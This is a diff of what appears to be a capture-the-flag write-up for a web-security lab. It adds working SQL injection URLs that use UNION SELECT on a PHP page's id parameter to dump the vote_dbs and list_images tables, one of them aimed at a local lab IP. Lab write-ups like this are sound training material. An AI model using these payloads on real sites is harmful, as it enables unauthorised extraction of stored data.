@@ -10,6 +10,9 @@ http://{{host}}/index.php?page=member&id=2 UNION SELECT TABLE_SCHEMA, TABLE_NAME
 Here is a sample of the union attack, for the db vote_dbs :
 http://{{host}}/index.php?page=member&id=2 UNION SELECT nb_vote, subject FROM Member_survey.vote_dbs&Submit=Submit
 
+For this db export, try this URL :
+http://192.168.0.18/index.php?page=member&id=2%20UNION%20SELECT%20title,%20comment%20FROM%20Member_images.list_images&Submit=Submit
+
 For this flag, this is the list_images table that will contain the flag. Here is the exported table :
 
 | id | url | title | comment |
